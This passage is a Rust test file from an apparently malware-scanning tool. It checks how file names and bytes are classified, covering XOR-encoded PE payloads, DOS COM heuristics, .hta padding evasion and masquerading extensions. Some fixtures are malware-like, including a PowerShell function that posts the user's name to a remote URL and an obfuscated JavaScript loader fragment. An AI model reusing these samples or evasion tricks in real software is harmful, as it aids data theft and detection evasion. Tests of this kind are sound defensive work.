    knf[0x500..0x507].copy_from_slice(&[0x26, 0xE7, 0x26, 0xF4, 0x26, 0xCD, 0x21]);
    assert!(
        detect(Path::new("45_js.knf"), &knf)
            .is_none_or(|detection| detection.file_type != FileType::DosCom),
        "Kotlin/Native metadata must not be classified as DOS COM"
    );
}

/// A PE under a repeating XOR key is opaque data, not Unknown: that is
/// what routes it to the generic analyzer and the `xor.*` facts.
#[test]
fn xor_encoded_pe_is_data() {
    let pe = include_bytes!("../../tests/fixtures/test.exe");
    let key = [0x55, 0x64, 0xee, 0x58, 0x6f, 0x83, 0xb8, 0x02];
    let enc: Vec<u8> = pe
        .iter()
        .zip(key.iter().cycle())
        .map(|(b, k)| b ^ k)
        .collect();
    // `.bin` is Data by name; the others reach Data only through the key.
    for name in ["hvnc.enc", "payload", "payload.bin"] {
        let det = detect(Path::new(name), &enc).expect("detected");
        assert_eq!(det.file_type, FileType::Data, "{name}");
        assert!(!det.extension_mismatch(), "{name}");
        let id = FileId::from_path_and_bytes(Path::new(name), &enc);
        assert_eq!(
            id.xor_pe_key().map(|k| k.bytes().to_vec()),
            Some(key.to_vec())
        );
    }
    // The plaintext image is still a PE by its magic, and carries no key.
    assert_detect("hvnc.enc", pe, FileType::Pe);
    assert!(
        FileId::from_path_and_bytes(Path::new("a.exe"), pe)
            .xor_pe_key()
            .is_none()
    );
}

/// A short NOP prefix before an XOR-encoded PE still exposes the image
/// through the normal FileId recovery path.
#[test]
fn prefixed_xor_encoded_pe_is_data_and_keeps_image_offset() {
    let pe = include_bytes!("../../tests/fixtures/test.exe");
    let mut plain = vec![0x90; 8];
    plain.extend_from_slice(pe);
    let enc: Vec<u8> = plain.iter().map(|b| b ^ 0x23).collect();
    let id = FileId::from_path_and_bytes(Path::new("payload"), &enc);
    assert_eq!(id.file_type(), FileType::Data);
    let key = id.xor_pe_key().expect("recover prefixed XOR PE");
    assert_eq!(key.bytes(), &[0x23]);
    assert_eq!(key.pe_offset(), 8);
    assert_eq!(key.decode(&enc), plain);
}

/// Size alone is not enough: a small binary with no `INT 21h` near the
/// front stays what it was, so an arbitrary short blob is not a program.
#[test]
fn small_binary_without_int21_is_not_dos_com() {
    let mut blob = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        blob[i] = 0x01;
    }
    assert_detect("prog.bin", &blob, FileType::Data);
    let det = detect(Path::new("prog"), &blob);
    assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
}

/// The same bytes past the 64 KiB COM limit are not a COM program: that is
/// how a ciphertext or firmware blob with a chance `CD 21` stays data.
#[test]
fn oversized_blob_with_int21_is_not_dos_com() {
    let mut blob = vec![0x01u8; heuristics::DOS_COM_MAX_SIZE + 1];
    blob[11] = 0xCD;
    blob[12] = 0x21;
    assert_detect("prog.bin", &blob, FileType::Data);
    let det = detect(Path::new("prog"), &blob);
    assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
}

#[test]
fn nostardamus_self_modifying_xor_entry_is_dos_com() {
    const SAMPLE: &[u8] = include_bytes!("../../testdata/dos-com/nostardamus-1870");
    assert_detect("nostardamus", SAMPLE, FileType::DosCom);
}

#[test]
fn utf16_source_with_m_extension_stays_objective_c() {
    let mut utf16 = vec![0xFFu8, 0xFE];
    for b in b"// objc comment\n".repeat(8) {
        utf16.push(b);
        utf16.push(0);
    }
    assert_detect("View.m", &utf16, FileType::ObjectiveC);
}

#[test]
fn zig_by_ext() {
    assert_ext("main.zig", FileType::Zig);
}

#[test]
fn elixir_by_ext() {
    assert_ext("app.ex", FileType::Elixir);
    assert_ext("test.exs", FileType::Elixir);
}

// ── Ruby ─────────────────────────────────────────────────────────

#[test]
fn ruby_by_ext() {
    assert_ext("app.rb", FileType::Ruby);
}

#[test]
fn ruby_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/env ruby\nputs 'hi'\n", FileType::Ruby);
}

// ── PHP ──────────────────────────────────────────────────────────

#[test]
fn php_by_ext() {
    assert_ext("page.php", FileType::Php);
}

#[test]
fn php_by_opening_tag() {
    assert_detect("page", b"<?php\necho 'hello';\n", FileType::Php);
}

#[test]
fn php_by_shebang() {
    assert_detect(
        "tool",
        b"#!/usr/bin/env php\n<?php echo 1;\n",
        FileType::Php,
    );
}

// ── Perl ─────────────────────────────────────────────────────────

#[test]
fn perl_by_ext() {
    assert_ext("script.pl", FileType::Perl);
    assert_ext("module.pm", FileType::Perl);
}

#[test]
fn cpan_makefile_pl_is_perl() {
    for name in ["Makefile.PL", "makefile.pl", "MAKEFILE.PL", "Build.PL"] {
        assert_ext(name, FileType::Perl);
        assert_detect(
            &format!("distribution/{name}"),
            b"use ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Example');\n",
            FileType::Perl,
        );
    }
    for name in ["Makefile", "Makefile.debug", "Makefile.in", "GNUmakefile"] {
        assert_detect(name, b"all:\n\techo hi\n", FileType::Makefile);
    }
}

#[test]
fn perl_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/perl\nuse strict;\n", FileType::Perl);
}

// ── Lua ──────────────────────────────────────────────────────────

#[test]
fn lua_by_ext() {
    assert_ext("script.lua", FileType::Lua);
}

#[test]
fn lua_by_shebang() {
    assert_detect("tool", b"#!/usr/bin/env lua\nprint('hi')\n", FileType::Lua);
}

// ── C# ───────────────────────────────────────────────────────────

#[test]
fn csharp_by_ext() {
    assert_ext("App.cs", FileType::CSharp);
}

// ── PowerShell ───────────────────────────────────────────────────

#[test]
fn powershell_by_ext() {
    assert_ext("script.ps1", FileType::PowerShell);
    assert_ext("module.psm1", FileType::PowerShell);
}

// An unmapped extension (`.posh`) and no extension at all both leave the
// decision to content; an advanced function with `Add-Type` is PowerShell.
#[test]
fn powershell_by_content_under_unknown_or_missing_extension() {
    let data = b"Add-Type -AssemblyName PresentationCore\r\n\
            function dischat {\r\n  [CmdletBinding()]\r\n  param ([string]$con)\r\n\
            Invoke-RestMethod -Uri $u -Method 'post' -Body @{ 'username' = $env:username }\r\n}\r\n";
    assert_detect("Nz97PyJr.posh", data, FileType::PowerShell);
    assert_detect("Nz97PyJr", data, FileType::PowerShell);
}

// ── Groovy / Scala ───────────────────────────────────────────────

#[test]
fn groovy_by_ext() {
    assert_ext("build.groovy", FileType::Groovy);
    assert_ext("build.gradle", FileType::Groovy);
}

#[test]
fn scala_by_ext() {
    assert_ext("App.scala", FileType::Scala);
}

#[test]
fn sc_markup_is_html_and_scala_script_stays_scala() {
    assert_detect(
        "Trojan.sc",
        b" <script>function x(){return 1}</script>\n",
        FileType::Html,
    );
    assert_detect(
        "worksheet.sc",
        b"import scala.util._\nprintln(1)\n",
        FileType::Scala,
    );
    assert_detect(
        "App.scala",
        b"<script>not really</script>\nobject App\n",
        FileType::Scala,
    );
}

#[test]
fn ex_variant_letter_yields_to_a_leading_mark() {
    assert_detect(
        "Trojan.BAT.Agent.ex",
        b"@echo       off\r\ncopy a b\r\n",
        FileType::Batch,
    );
    assert_detect(
        "Backdoor.ASP.Ace.ex",
        b"<%@ LANGUAGE = VBScript.Encode %>\r\n<%\r\n",
        FileType::Asp,
    );
    assert_detect(
        "Exploit.JS.RealPlr.ex",
        b"<sCrIpT lAnGuAgE=\"jAvAsCrIpT\">\r\n",
        FileType::Html,
    );
    let mut utf16 = vec![0xff, 0xfe];
    for b in b"<!DOCTYPE HTML" {
        utf16.push(*b);
        utf16.push(0);
    }
    assert_detect("Trojan.JS.Agent.ex", &utf16, FileType::Html);
    assert_detect(
        "revshell.ex",
        b"defmodule Revshell do\n  def run do\n  end\nend\n",
        FileType::Elixir,
    );
    assert_detect("tool.exs", b"@echo off\r\n", FileType::Elixir);
}

// ── C/C++ ────────────────────────────────────────────────────────

#[test]
fn c_by_ext() {
    assert_ext("main.c", FileType::C);
    assert_ext("main.h", FileType::C);
    assert_ext("main.cpp", FileType::C);
    assert_ext("main.hpp", FileType::C);
}

// ── Manifests ────────────────────────────────────────────────────

#[test]
fn package_json() {
    let det = detect(Path::new("package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageJson);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn package_lock_json() {
    let det = detect(Path::new("package-lock.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageLockJson);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn composer_json() {
    assert_ext("composer.json", FileType::ComposerJson);
}

#[test]
fn cargo_toml() {
    assert_ext("Cargo.toml", FileType::CargoToml);
}

#[test]
fn pyproject_toml() {
    assert_ext("pyproject.toml", FileType::PyProjectToml);
}

#[test]
fn vsix_manifest() {
    assert_detect("extension.vsixmanifest", b"<xml/>", FileType::VsixManifest);
}

#[test]
fn chrome_manifest() {
    let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
    assert_detect("manifest.json", data, FileType::ChromeManifest);
}

#[test]
fn github_actions_workflow() {
    let det = detect(Path::new(".github/workflows/ci.yml"), b"name: CI\n").unwrap();
    assert_eq!(det.file_type, FileType::GithubActions);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn github_actions_workflow_by_content() {
    let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
    let det = detect(Path::new("ci.yml"), data).unwrap();
    assert_eq!(det.file_type, FileType::GithubActions);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert!(!det.extension_mismatch());
}

#[test]
fn github_actions_composite() {
    assert_detect("action.yml", b"name: My Action\n", FileType::GithubActions);
}

#[test]
fn systemd_service() {
    assert_detect(
        "evil.service",
        b"[Unit]\nDescription=Evil\n[Service]\nExecStart=/bin/true\n",
        FileType::SystemdService,
    );
}

#[test]
fn axml_magic_is_xml() {
    let mut doc = vec![0x03, 0x00, 0x08, 0x00, 0, 0, 0, 0, 0x01, 0x00, 0x1c, 0x00];
    let len = u32::try_from(doc.len()).unwrap().to_le_bytes();
    doc[4..8].copy_from_slice(&len);
    assert_detect("res/K1.xml", &doc, FileType::Xml);
    assert_detect("res/K1.bin", &doc, FileType::Xml);
    let mut short = doc.clone();
    short[4] = 0xff;
    // `.bin` is data by extension. A size field that does not cover the
    // buffer must not promote it to XML.
    let det = detect(Path::new("res/K1.bin"), &short).unwrap();
    assert_eq!(det.file_type, FileType::Data);
}

#[test]
fn binary_service_or_desktop_suffix_is_data() {
    // `0x01` keeps the body binary without a lane of NULs, which
    // would otherwise read as UTF-16 text and stay on the extension.
    let mut boot = vec![0x01; 512];
    boot[0] = 0xEA;
    boot[510] = 0x55;
    boot[511] = 0xAA;
    assert_detect("Virus.Boot.Stoned.Service", &boot, FileType::Data);
    assert_detect("payload.desktop", &boot, FileType::Data);
}

#[test]
fn systemd_service_drop_in() {
    assert_ext(
        "/etc/systemd/system/ssh.service.d/override.conf",
        FileType::SystemdService,
    );
}

#[test]
fn pkg_info() {
    assert_detect("PKG-INFO", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
    assert_detect("METADATA", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
}

#[test]
fn arch_package_metadata_files_are_text() {
    assert_detect(".PKGINFO", b"pkgname = wasm-pkg-tools\n", FileType::Text);
    assert_detect(".BUILDINFO", b"format = 2\n", FileType::Text);
    assert_detect(".MTREE", b"#mtree\n", FileType::Text);
}

// ── Archives ─────────────────────────────────────────────────────

#[test]
fn zip_archive() {
    assert_detect("data.zip", b"PK\x03\x04content", FileType::Zip);
}

#[test]
fn rar_archive() {
    assert_detect("data.rar", b"Rar!\x1a\x07\x01\x00", FileType::Rar);
}

#[test]
fn gzip_archive() {
    assert_detect("data.gz", &[0x1f, 0x8b, 0x08, 0x00], FileType::Gz);
}

#[test]
fn xz_archive() {
    assert_detect("data.xz", b"\xfd7zXZ\x00", FileType::Xz);
}

#[test]
fn bzip2_archive() {
    assert_detect("data.bz2", b"BZh91AY&SY", FileType::Bz2);
}

#[test]
fn dmg_udif_archive() {
    let mut data = vec![0u8; 2048];
    data[63..66].copy_from_slice(b"BZh");
    let trailer = data.len() - 512;
    data[trailer..trailer + 4].copy_from_slice(b"koly");
    data[trailer + 4..trailer + 8].copy_from_slice(&4u32.to_be_bytes());
    data[trailer + 8..trailer + 12].copy_from_slice(&512u32.to_be_bytes());

    assert_detect("data.dmg", &data, FileType::Dmg);
}

#[test]
fn sevenz_archive() {
    assert_detect("data.7z", b"7z\xBC\xAF\x27\x1C\x00", FileType::SevenZ);
}

#[test]
fn zstd_archive() {
    assert_detect("data.zst", &[0x28, 0xB5, 0x2F, 0xFD, 0, 0], FileType::Zst);
}

#[test]
fn freebsd_pkg_zstd_is_not_extension_mismatch() {
    let data = {
        let mut tar = tar::Builder::new(Vec::new());
        let mut h = tar::Header::new_ustar();
        h.set_path("+COMPACT_MANIFEST").unwrap();
        h.set_size(7);
        h.set_cksum();
        tar.append(&h, &b"payload"[..]).unwrap();
        zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
    };
    // FreeBSD `.pkg` (zstd tar) now carries its own ecosystem type; the
    // `.pkg`→macOS extension default is a benign refinement, suppressed at
    // the FileId level where consumers read it.
    let id = FileId::from_path_and_bytes(Path::new("BerkeleyGW-4.0_2.pkg"), &data);
    assert_eq!(id.file_type(), FileType::PkgFreebsd);
    assert!(!id.extension_mismatch());
}

#[test]
fn tar_gz_by_ext() {
    assert_ext("data.tar.gz", FileType::TarGz);
    assert_ext("data.tgz", FileType::TarGz);
}

#[test]
fn deb_by_ext() {
    assert_ext("package.deb", FileType::Deb);
}

#[test]
fn gem_by_ext() {
    // A gem is an uncompressed tar with no offset-0 magic, so it resolves
    // through the extension fallback to its own type (not generic Tar).
    assert_ext("rails-7.0.4.gem", FileType::Gem);
}

#[test]
fn specialized_package_extensions() {
    // Void and Gentoo packages resolve through the extension fallback to
    // their own ecosystem types, not generic tar/tar.zst.
    assert_ext("zlib-1.3_1.x86_64.xbps", FileType::Xbps);
    assert_ext("app-1.0-1.gpkg.tar", FileType::GentooBinpkg);
    // The Arch `.pkg.tar.*` family maps to PkgArch by extension.
    assert_ext("foo-1.0-1-x86_64.pkg.tar.zst", FileType::PkgArch);
    assert_ext("foo-1.0-1-x86_64.pkg.tar.xz", FileType::PkgArch);
    assert_ext("foo-1.0-1-x86_64.pkg.tar", FileType::PkgArch);
}

#[test]
fn apk_split_is_not_an_extension_mismatch() {
    // Both `.apk` ecosystems are content-detected away from the extension's
    // zip default, but that disambiguation is benign — not an evasion flag.
    let android = FileId::from_path_and_bytes(Path::new("app.apk"), b"PK\x03\x04zip body");
    assert_eq!(android.file_type(), FileType::ApkAndroid);
    assert!(!android.extension_mismatch());

    let alpine = FileId::from_path_and_bytes(Path::new("musl.apk"), &[0x1f, 0x8b, 0x08, 0x00]);
    assert_eq!(alpine.file_type(), FileType::ApkAlpine);
    assert!(!alpine.extension_mismatch());
}

/// `detect` excuses the same format conventions `FileId` does, so the two
/// public entry points agree on whether a name is a masquerade. The type
/// the extension implies is still reported.
#[test]
fn detect_and_file_id_agree_on_benign_mismatches() {
    let elf = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    for (name, data, ext_type) in [
        ("app.apk", &b"PK\x03\x04zip body"[..], FileType::Zip),
        ("musl.apk", &[0x1f, 0x8b, 0x08, 0x00][..], FileType::Zip),
        ("._invoice.pdf", &elf[..], FileType::Pdf),
    ] {
        let det = detect(Path::new(name), data).expect("detected");
        let id = FileId::from_path_and_bytes(Path::new(name), data);
        assert_eq!(det.file_type, id.file_type(), "{name}");
        assert!(!id.extension_mismatch(), "{name}");
        assert!(!det.extension_mismatch(), "{name}");
        assert_eq!(det.extension_type(), Some(ext_type), "{name}");
    }
    // Without the AppleDouble prefix the same file is a masquerade to both.
    let det = detect(Path::new("invoice.pdf"), elf).expect("detected");
    let id = FileId::from_path_and_bytes(Path::new("invoice.pdf"), elf);
    assert!(det.extension_mismatch());
    assert!(id.extension_mismatch());
}

#[test]
fn package_types_stay_in_archive_group() {
    // Fine-grained package identity must not leak out of the coarse
    // `archive` group that downstream consumers key on.
    for ft in [
        FileType::Gem,
        FileType::ApkAndroid,
        FileType::ApkAlpine,
        FileType::Npm,
        FileType::Crate,
        FileType::Conda,
        FileType::Egg,
        FileType::Nupkg,
        FileType::Ipa,
        FileType::Vsix,
        FileType::PkgMacos,
        FileType::Dmg,
        FileType::PkgFreebsd,
        FileType::PkgArch,
        FileType::PythonSdist,
        FileType::OciImage,
        FileType::Xbps,
        FileType::GentooBinpkg,
    ] {
        assert!(ft.is_archive(), "{ft:?} should be an archive");
        assert_eq!(file_group(ft), "archive", "{ft:?} group");
    }
}

#[test]
fn rpm_by_ext() {
    assert_ext("package.rpm", FileType::Rpm);
}

#[test]
fn flatpak_groups_as_archive_but_is_not_walkable() {
    assert_eq!(file_group(FileType::Flatpak), "archive");
    assert!(!FileType::Flatpak.is_archive());
}

#[test]
fn is_archive_returns_true_for_archives() {
    assert!(FileType::Zip.is_archive());
    assert!(FileType::TarGz.is_archive());
    assert!(FileType::Rar.is_archive());
    assert!(FileType::SevenZ.is_archive());
    assert!(FileType::Deb.is_archive());
    assert!(FileType::Jar.is_archive());
    assert!(FileType::Snap.is_archive());
    assert!(FileType::SquashFs.is_archive());
    assert!(!FileType::Elf.is_archive());
    assert!(!FileType::Python.is_archive());
}

#[test]
fn is_binary_returns_true_for_binaries() {
    assert!(FileType::Elf.is_binary());
    assert!(FileType::Pe.is_binary());
    assert!(FileType::MachO.is_binary());
    assert!(FileType::JavaClass.is_binary());
    assert!(FileType::Dex.is_binary());
    assert!(!FileType::Zip.is_binary());
    assert!(!FileType::Python.is_binary());
}

#[test]
fn is_structured_data_true_for_fully_parsed_manifests() {
    assert!(FileType::PackageJson.is_structured_data());
    assert!(FileType::CargoToml.is_structured_data());
    assert!(FileType::GithubActions.is_structured_data());
    assert!(FileType::Plist.is_structured_data());
    assert!(FileType::SrcInfo.is_structured_data());
    // Generic JSON is size-limited and may fall back to a text scan, so it
    // is deliberately *not* treated as fully-parsed structured data.
    assert!(!FileType::Json.is_structured_data());
    assert!(!FileType::Python.is_structured_data());
    assert!(!FileType::Elf.is_structured_data());
}

// ── Documents ────────────────────────────────────────────────────

#[test]
fn pdf_magic() {
    assert_detect("doc.pdf", b"%PDF-1.4 content", FileType::Pdf);
}

#[test]
fn pdf_by_ext() {
    assert_ext("doc.pdf", FileType::Pdf);
}

#[test]
fn rtf_magic() {
    assert_detect("doc.rtf", b"{\\rtf1\\ansi content", FileType::Rtf);
}

#[test]
fn recognizes_obfuscated_rtf_object_with_malformed_header() {
    let sample = include_bytes!("../../tests/fixtures/rtf/obfuscated-object.sample");
    assert_detect("document.unknown", sample, FileType::Rtf);
    assert_eq!(
        magic::detect_from_content(Path::new("document.unknown"), sample),
        Some((FileType::Rtf, DetectionSource::Heuristic))
    );
    assert_eq!(
        magic::detect_from_content(Path::new("document.unknown"), b"{\\rt some text \\object"),
        None,
        "a lone object marker must not make arbitrary text an RTF document"
    );
}

#[test]
fn ole_doc_magic() {
    let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    data.extend_from_slice(&[0; 100]);
    assert_detect("doc.doc", &data, FileType::OleDoc);
}

#[test]
fn ole_by_ext() {
    assert_ext("file.doc", FileType::OleDoc);
    assert_ext("file.xls", FileType::OleDoc);
    assert_ext("file.ppt", FileType::OleDoc);
    assert_ext("file.msg", FileType::OleDoc);
}

#[test]
fn msi_by_ext_and_magic() {
    assert_ext("setup.msi", FileType::Msi);
    assert_ext("patch.msp", FileType::Msi);
    assert_ext("custom.mst", FileType::Msi);
    assert_ext("merge.msm", FileType::Msi);
    let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    data.extend_from_slice(&[0; 100]);
    // Extension gates CFBF: installer family → Msi, .doc → OleDoc, bare → OleDoc.
    assert_detect("setup.msi", &data, FileType::Msi);
    assert_detect("patch.msp", &data, FileType::Msi);
    assert_detect("custom.mst", &data, FileType::Msi);
    assert_detect("merge.msm", &data, FileType::Msi);
    assert_detect("doc.doc", &data, FileType::OleDoc);
    assert_detect("untitled.bin", &data, FileType::OleDoc);
}

#[test]
fn ooxml_by_ext_magic() {
    // The Office extension is honoured only when the bytes back it up.
    // Every OOXML document is an OPC package and names
    // `[Content_Types].xml` as its first entry; a zip that only carries
    // the extension is a zip, and is analyzed as one.
    let opc = b"PK\x03\x04[Content_Types].xml".as_slice();
    assert_detect("report.docx", opc, FileType::Ooxml);
    assert_detect("sheet.xlsx", opc, FileType::Ooxml);
    assert_detect("slides.pptx", opc, FileType::Ooxml);
    assert_detect("report.docx", b"PK\x03\x04office", FileType::Zip);
}

#[test]
fn ooxml_by_ext_only() {
    assert_ext("report.docx", FileType::Ooxml);
    assert_ext("report.docm", FileType::Ooxml);
}

// ── Apple formats ────────────────────────────────────────────────

#[test]
fn applescript_magic() {
    assert_detect("script.scpt", b"Fasd\x00\x00", FileType::AppleScript);
}

#[test]
fn applescript_by_ext() {
    assert_ext("script.scpt", FileType::AppleScript);
    assert_ext("script.applescript", FileType::AppleScript);
}

#[test]
fn plist_binary() {
    assert_detect("prefs", b"bplist00\x00\x00\x00", FileType::Plist);
}

#[test]
fn plist_xml() {
    assert_detect(
        "Info.plist",
        b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist>",
        FileType::Plist,
    );
}

#[test]
fn interface_builder_sources_are_xml() {
    let xib = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<document type=\"com.apple.InterfaceBuilder3.Cocoa.XIB\" version=\"3.0\">";
    let det = detect(Path::new("Main.xib"), xib).unwrap();
    assert_eq!(det.file_type, FileType::Xml);
    assert!(!det.extension_mismatch());
    let det = detect(Path::new("Main.storyboard"), xib).unwrap();
    assert_eq!(det.file_type, FileType::Xml);
    assert!(!det.extension_mismatch());
}

#[test]
fn plist_by_ext() {
    assert_ext("prefs.plist", FileType::Plist);
}

// ── Images ───────────────────────────────────────────────────────

#[test]
fn jpeg_magic() {
    assert_detect(
        "photo.jpg",
        &[0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10],
        FileType::Jpeg,
    );
}

#[test]
fn jpeg_by_ext() {
    assert_ext("photo.jpg", FileType::Jpeg);
    assert_ext("photo.jpeg", FileType::Jpeg);
}

#[test]
fn png_magic() {
    assert_detect(
        "image.png",
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
        FileType::Png,
    );
}

#[test]
fn riff_form_type_selects_wave_and_routes_cursors_to_data() {
    let mut wave = b"RIFF".to_vec();
    wave.extend_from_slice(&16u32.to_le_bytes());
    wave.extend_from_slice(b"WAVE");
    assert_detect("clip.wav", &wave, FileType::Wav);
    let mut webp = b"RIFF".to_vec();
    webp.extend_from_slice(&16u32.to_le_bytes());
    webp.extend_from_slice(b"WEBP");
    assert_detect("pic.webp", &webp, FileType::Webp);
    let mut cursor = b"RIFF".to_vec();
    cursor.extend_from_slice(&16u32.to_le_bytes());
    cursor.extend_from_slice(b"ACON");
    assert_eq!(
        detect(Path::new("cursor.ani"), &cursor).unwrap().file_type,
        FileType::Data
    );
    let renamed = detect(Path::new("cursor.wav"), &cursor).unwrap();
    assert_eq!(renamed.file_type, FileType::Data);
    assert!(renamed.extension_mismatch());
    assert_eq!(
        detect(Path::new("artifact.bin"), &cursor)
            .unwrap()
            .file_type,
        FileType::Data
    );
}

#[test]
fn png_by_ext() {
    assert_ext("image.png", FileType::Png);
}

#[test]
fn svg_magic_bare_root() {
    assert_detect(
        "noext",
        b"<svg xmlns=\"http://www.w3.org/2000/svg\">",
        FileType::Svg,
    );
    assert_detect("noext", b"<svg>", FileType::Svg);
}

#[test]
fn svg_magic_with_xml_prolog() {
    // Real-world SVGs frequently lead with an XML prolog (and sometimes a
    // DOCTYPE) before the <svg> root; these must still resolve to Svg, not
    // generic Xml.
    assert_detect(
        "noext",
        b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"x\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn svg_by_ext() {
    assert_detect(
        "logo.svg",
        b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn document_names_do_not_hide_javascript() {
    let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
    for path in [
        "notes.rst",
        "readme.adoc",
        "app.log",
        "rows.csv",
        "rows.tsv",
        "icon.svg",
    ] {
        assert_detect(path, js, FileType::JavaScript);
    }
    assert_detect(
        "notes.rst",
        b"Title\n=====\n\nJust a paragraph.\n",
        FileType::Text,
    );
    assert_detect("rows.csv", b"name,count\nalice,1\n", FileType::Text);
}

#[test]
fn svg_is_image_group() {
    // SVG belongs to the media (image) group so a binary renamed .svg is a
    // binary→image masquerade, even though its content is scanned as XML.
    assert_eq!(file_group(FileType::Svg), "image");
}

#[test]
fn hta_is_html() {
    // mshta.exe runs an HTML Application as a local-trust program, and the
    // extension went unmapped, so every .hta landed as Unknown -- a type no
    // trait targets, which made this long-standing malware delivery format
    // invisible to rule matching.
    assert_detect(
        "installer.hta",
        b"<html><head><hta:application id=\"a\"/></head><body></body></html>",
        FileType::Html,
    );
}

#[test]
fn front_padded_html_is_still_html() {
    // Observed evasion: an .hta dropper opened with `try {` and ~275 KB of
    // `;` before its first `<html>`, pushing the markup past the old 4 KiB
    // content check. Falling back to Unknown is the worst outcome available
    // -- it matches no trait at all -- so the extension-corroborated check
    // has to see through the padding.
    let mut data = b"try {\n".to_vec();
    data.resize(3 * 1024 * 1024, b';');
    data.extend_from_slice(b"\n<html><head><title>x</title></head></html>\n} catch(e) {}");
    assert_detect("padded.hta", &data, FileType::Html);
}

#[test]
fn html_page_with_inline_svg_is_html() {
    // An icon in the navigation bar does not make the page an image, and
    // typing it as SVG skips every HTML rule.
    assert_detect(
        "panel.html",
        b"<!DOCTYPE html>\n<html lang=\"en\"><body><nav><svg width=\"20\"></svg></nav>",
        FileType::Html,
    );
}

#[test]
fn xhtml_with_inline_svg_is_not_an_image() {
    // An `<?xml` prolog is allowed before an SVG root, so the doctype
    // check alone does not settle XHTML. An `<html>` element ahead of
    // the `<svg>` does: the svg is a child of the page.
    let data = b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>";
    let det = detect(Path::new("page.xhtml"), data).expect("a type");
    assert_ne!(det.file_type, FileType::Svg);
}

#[test]
fn svg_doctype_still_detects_svg() {
    assert_detect(
        "noext",
        b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"></svg>",
        FileType::Svg,
    );
}

#[test]
fn xml_prolog_without_svg_stays_xml() {
    assert_detect("noext", b"<?xml version=\"1.0\"?>\n<root/>", FileType::Xml);
}

// ── Other formats ────────────────────────────────────────────────

#[test]
fn lnk_magic() {
    let mut data = vec![
        0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x46,
    ];
    data.extend_from_slice(&[0; 100]);
    assert_detect("shortcut.lnk", &data, FileType::Lnk);
}

#[test]
fn lnk_by_ext() {
    assert_ext("shortcut.lnk", FileType::Lnk);
}

#[test]
fn chm_magic() {
    // ITSF header: ITSF + version=3 + header_len + 1 + timestamp + lcid
    let mut data = b"ITSF".to_vec();
    data.extend_from_slice(&3u32.to_le_bytes()); // version
    data.extend_from_slice(&[0u8; 24]); // padding
    assert_detect("help.chm", &data, FileType::Chm);
}

#[test]
fn chm_by_ext() {
    assert_ext("help.chm", FileType::Chm);
}

#[test]
fn pickle_magic() {
    assert_detect("model.pkl", &[0x80, 0x04, 0x95, 0x00], FileType::Pickle);
}

#[test]
fn pickle_by_ext() {
    assert_ext("model.pkl", FileType::Pickle);
    assert_ext("data.pickle", FileType::Pickle);
    assert_ext("page.doctree", FileType::Pickle);

    let data = [0x80, 0x04, 0x95, 0x00, 0, 0, 0, 0, 0, 0, 0, b'.'];
    let detected = FileId::from_path_and_bytes(Path::new("page.doctree"), &data);
    assert_eq!(detected.file_type(), FileType::Pickle);
    assert!(!detected.extension_mismatch());
}

#[test]
fn html_with_content() {
    assert_detect(
        "page.html",
        b"<!DOCTYPE html><html><body>hi</body></html>",
        FileType::Html,
    );
}

#[test]
fn html_without_content_skipped() {
    // .html extension but no HTML tags → skip
    assert!(detect(Path::new("page.html"), b"just plain text").is_none());
}

#[test]
fn extensionless_php_html_fragment_detects_as_php() {
    let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
    let det = detect(Path::new("wordpress-cache-fragment"), data)
        .expect("expected PHP heuristic detection");
    assert_eq!(det.file_type, FileType::Php);
    assert_eq!(det.source, DetectionSource::Heuristic);
}

#[test]
fn markdown_by_ext() {
    assert_ext("readme.md", FileType::Markdown);
    assert_ext("notes.markdown", FileType::Markdown);
}

#[test]
fn makefile_path_only_detection() {
    assert_detect("Makefile", b"all:\n\techo hi\n", FileType::Makefile);
    assert_detect("Makefile.debug", b"all:\n\techo hi\n", FileType::Makefile);
